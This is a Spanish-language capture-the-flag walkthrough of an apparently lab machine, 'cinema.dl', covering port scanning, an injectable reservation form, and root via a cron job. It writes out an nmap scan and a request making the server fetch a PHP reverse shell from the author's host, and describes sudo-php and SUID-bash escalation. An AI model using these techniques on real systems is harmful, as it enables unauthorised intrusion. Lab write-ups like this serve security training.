Escaneo de puertos con Nmap:
```
nmap -p- -sC -sV -sS --min-rate 5000 -n -vvv -Pn 172.17.0.2 -oN escaneo
```

![](../../../Images/Pasted%20image%2020250205131104.png)

Observo lo que corre en el único puerto abierto:

![](../../../Images/Pasted%20image%2020250205131227.png)

Dando click en todas las películas la página no me redirecciona a ningún lado, a excepción de la película El tiempo que tenemos esa si me deja ver mas datos:

![](../../../Images/Pasted%20image%2020250205131555.png)

Selecciono un asiento para "hacer la reserva" y doy click en el botón azul y me aparece el recuadro:

![](../../../Images/Pasted%20image%2020250205131625.png)

Si coloco en  el campo de nombre:
```
<h1>Canary</h1>
```
Me aparece:

![](../../../Images/Pasted%20image%2020250205131704.png)

![](../../../Images/Pasted%20image%2020250205131713.png)

Y me doy cuenta que la página es vulnerable a un XSS o Cross-site scripting

Procedo a abrir BurpSuite e interceptar la petición para ver como se procesa por detrás:

![](../../../Images/Pasted%20image%2020250205132729.png)

Me doy cuenta que la información que se envía se almacena en un "problem url"

Entonces me crearé una Reverse Shell

![](../../../Images/Pasted%20image%2020250205132849.png)

Me levanto un servidor con python:

![](../../../Images/Pasted%20image%2020250205132910.png)

Y recibiré la conexión junto con el shell.php desde la página web
```
[http://cinema.dl/reservation.php?problem_url=http://192.168.1.35/shell.php](http://cinema.dl/reservation.php?problem_url=http://192.168.1.35/shell.php)
```

![](../../../Images/Pasted%20image%2020250205133037.png)

![](../../../Images/Pasted%20image%2020250205133137.png)

Y listo, quedó subida mi RevShell, ahora tendré que buscar donde se subió

Investigando un poco la web, me doy cuenta que existe un directorio llamado "/andrewgarfield" así como uno de los personajes de la película y en este directorio está mi archivo .php

![](../../../Images/Pasted%20image%2020250205133256.png)

Procedo a ponerme a la escucha con Netcat y dar click en mi archivo

![](../../../Images/Pasted%20image%2020250205133658.png)

Recibo la conexión y ahora estoy dentro de la máquina

Tratamiento de la TTY:

![](../../../Images/Pasted%20image%2020250205133734.png)

![](../../../Images/Pasted%20image%2020250205133752.png)

## ESCALADA DE PRIVILEGIOS

En el directorio /opt me encuentro con un .sh, lo leo:

![](../../../Images/Pasted%20image%2020250205135426.png)

Y dice que al momento que sea el usuario boss me sacará de la sesión debido a este script,
por lo que puedo intuir que puede haber algun Crontab.
Si voy  a /var/spool/cron y listo veo lo siguiente:

![](../../../Images/Pasted%20image%2020250205135625.png)

Que el usuario boss puede efectivamente leer este archivo, así que procedo a mirar como puedo escalar a él:

Ejecuto sudo -l para ver el binario que puedo usar

![](../../../Images/Pasted%20image%2020250205134310.png)

Puedo ser boss con el binario Php

Miro en GTFOBins como puedo escalar con este binario:

![](../../../Images/Pasted%20image%2020250205134242.png)

Lo ejecuto:

![](../../../Images/Pasted%20image%2020250205134451.png)

Y ahora soy el usuario boss

Voy rapidamente al directorio /var/spool/cron y leo el archivo que contiene adentro:

![](../../../Images/Pasted%20image%2020250205135857.png)

Tengo un root.sh el cuál me dice que se ejecutan 2 scripts cada cierto tiempo y hace mención a 2 archivos, el primero ya lo leí anteriormente así que buscaré el segundo en /tmp:

![](../../../Images/Pasted%20image%2020250205135939.png)

Observo que no hay ningún archivo creado

Por ende crearé mi propio script.sh para que al momento que se ejecuté me dé permisos en la bash y pueda escalar:

![](../../../Images/Pasted%20image%2020250205140204.png)

Le doy permisos de ejecución y espero un momento:

![](../../../Images/Pasted%20image%2020250205140233.png)

Escribo bash -p

![](../../../Images/Pasted%20image%2020250205140337.png)

Y listo, ya soy ROOT

Flag de user:

![](../../../Images/Pasted%20image%2020250205140408.png)

Flag de root:

![](../../../Images/Pasted%20image%2020250205140425.png)
